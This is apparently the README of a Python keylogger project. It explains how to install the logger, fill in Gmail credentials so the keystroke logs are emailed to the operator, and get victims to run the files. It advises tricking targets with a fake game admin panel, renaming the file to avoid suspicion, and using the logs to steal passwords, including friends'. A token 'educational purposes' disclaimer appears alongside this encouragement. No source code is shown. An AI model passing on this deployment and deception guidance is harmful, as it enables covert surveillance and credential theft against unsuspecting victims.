(
1- This is a working keylogger where it records keystrokes when executed. 
2- You can make a victim download this file and execute it, depending on what email address you have chosen you will get an email in your gmail inbox with a file attached showing what all your victim has typed.
3- Do NOT use it if your upto no good. It is only for educational perposes.
4- You cant just open it and think it will work, there are multiple steps like enabling less secure apps in the gmail you are using for this and more.
5- DO WATCH MY VIDEO TO UNDERSTAND HOW TO SET IT UP.
)

USAGE

When executed the keylogger.py starts 
It then saves the keystrokes in a file
Then execute the send_email.py 
This send those files to your email 
conclusion- all you need to do is get ur victim to execute 2 files (and yes, they need to have python installed).
You can make them do it bye saying its a file that gives you an admin panel for some game wich will temp them to execute this (go get creative).

SETUP

(1)- download code/send code to target
(2) - Open terminal and type pip install pyxhook (if it dosnt work download this module manually like i did), pip install os and pip install smtplib. Also fill in your email credentials, password, emails body, etc. in the send_email.py file. Also turn on less secure Less secure app access so python can send a email using that gmail(i would recommend using a trash account for this or make a new one for this  because its not a great idea to use your main account for this).
(3) - cd to the file you saved it to from terminal. eg.- cd /home/sirus-black4/Desktop/Downloads/junk/7/keylogger-python-main/
(4) - execute keylogger.py to start the keylogger (remember to change the name of this file to something else because your victim might get suspicious.)
(5) - execute the send_email.py to send a email to your self with the file were the logs were saved (remember that you must save the send_email.py file in the same location were the logs are being saved (~/Desktop/file.log). The keylogger.py file can be stored anywhere.
(6) - Thats all! You will get a email with a attachment of the file.log. pretty cool right? now you can see what your victim is typing, a good way to steal passwords dont you think? you can get creative and use it in different ways like using the keylogger on yourself when your friends want to log into thier account or something on your pc.
